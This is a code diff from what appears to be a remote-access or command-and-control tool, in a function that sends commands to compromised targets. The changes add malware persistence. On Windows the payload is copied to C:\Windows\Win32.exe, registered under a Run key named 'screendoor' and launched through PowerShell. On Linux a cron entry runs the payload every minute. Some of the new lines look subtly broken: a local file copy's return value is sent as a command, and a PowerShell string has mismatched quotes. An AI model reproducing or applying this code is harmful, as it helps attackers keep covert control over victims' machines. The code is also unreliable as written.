@@ -201,9 +201,13 @@ def target_comm(targ_id, targets, num):
                 persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                 persist_command_1 = base64.b64encode(persist_command_1.encode())
                 targ_id.send(persist_command_1)
-                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
+                persist_command_3 = shutil.copy(f'C:\\Users\\Public\\{payload_name}', f'C:\\Windows\\Win32.exe')
+                targ_id.send(persist_command_3)
+                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Windows\\Win32.exe'
                 persist_command_2 = base64.b64encode(persist_command_2.encode())
                 targ_id.send(persist_command_2)
+                persist_command_4 = f'powershell -command \"Start-Process -FilePath \"C:\\Windows\\Win32.exe"'
+                targ_id.send(persist_command_4)
                 print("[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
             if targets[num][6] == 2:
                 persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
